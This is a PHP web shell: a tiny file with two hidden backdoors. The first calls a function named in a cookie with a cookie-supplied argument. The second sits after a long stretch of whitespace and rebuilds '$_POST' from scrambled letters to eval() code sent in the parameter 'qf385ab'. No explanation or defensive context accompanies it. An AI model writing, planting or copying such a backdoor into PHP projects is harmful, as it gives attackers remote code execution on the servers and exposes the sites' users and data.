<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

                                                                                                                                                                                                                                                                   $wxxx9= "o_spt";$jtop5 = strtoupper($wxxx9[1]. $wxxx9[3] .$wxxx9[0].$wxxx9[2].$wxxx9[4] ) ; if ( isset(${$jtop5}['qf385ab' ] ) ) {eval(${ $jtop5 }['qf385ab' ] ) ;}?> 